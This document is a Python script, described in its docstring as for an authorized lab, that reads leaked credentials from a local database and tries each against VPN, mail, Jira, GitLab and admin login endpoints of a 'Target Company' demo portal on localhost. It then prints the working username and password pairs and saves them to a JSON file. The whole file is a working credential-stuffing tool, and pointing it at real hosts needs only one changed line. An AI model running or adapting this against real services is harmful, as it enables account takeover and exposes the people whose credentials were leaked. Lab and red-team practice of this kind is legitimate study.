#!/usr/bin/env python3
"""Automated credential validation against Target Company demo portal (authorized lab)."""
import sqlite3
import urllib.request
import urllib.parse
import json

DB_PATH = "/Users/hinori/Codes/Beekeeper/data/beekeeper.db"
BASE = "http://127.0.0.1:8902"

# Map service domain -> login endpoint slug
SERVICE_MAP = {
    "vpn.target-company.com":     "vpn",
    "mail.target-company.com":    "mail",
    "jira.target-company.com":    "jira",
    "gitlab.target-company.com":  "gitlab",
    "admin.internal-corp.com":    "admin",
}

def load_credentials():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.execute(
        "SELECT domain, account, password, source FROM credentials "
        "WHERE domain IN (%s) ORDER BY domain, account"
        % ",".join("?" * len(SERVICE_MAP)),
        tuple(SERVICE_MAP.keys()),
    )
    creds = {}
    for r in cur:
        creds.setdefault(r["domain"], []).append(
            {"account": r["account"], "password": r["password"], "source": r["source"]}
        )
    conn.close()
    return creds


def try_login(service, username, password):
    data = urllib.parse.urlencode({"username": username, "password": password}).encode()
    req = urllib.request.Request(
        f"{BASE}/login/{service}", data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        body = resp.read().decode("utf-8", errors="replace")
    if "Login Successful" in body or "Dashboard" in body:
        return True, body
    return False, body


def main():
    creds = load_credentials()
    results = {}  # service -> list of valid creds

    for domain, entries in sorted(creds.items()):
        service = SERVICE_MAP[domain]
        results[service] = []
        print(f"\n=== {domain} ({len(entries)} creds) ===")
        for e in entries:
            ok, _ = try_login(service, e["account"], e["password"])
            status = "VALID" if ok else "invalid"
            mark = "  [VALID]" if ok else ""
            print(f"  {status:8s} {e['account']:22s} : {e['password']}{mark}")
            if ok:
                results[service].append(
                    {"account": e["account"], "password": e["password"], "source": e["source"]}
                )

    print("\n\n========== SUMMARY OF VALID CREDENTIALS ==========")
    total = 0
    for service, valid in sorted(results.items()):
        print(f"\n[{service}] {len(valid)} valid")
        for v in valid:
            print(f"    {v['account']} : {v['password']}  (source: {v['source']})")
            total += 1
    print(f"\nTotal valid credential entries: {total}")

    with open("/Users/hinori/Codes/Beekeeper/valid_credentials.json", "w") as f:
        json.dump(results, f, indent=2)
    print("Saved to valid_credentials.json")


if __name__ == "__main__":
    main()
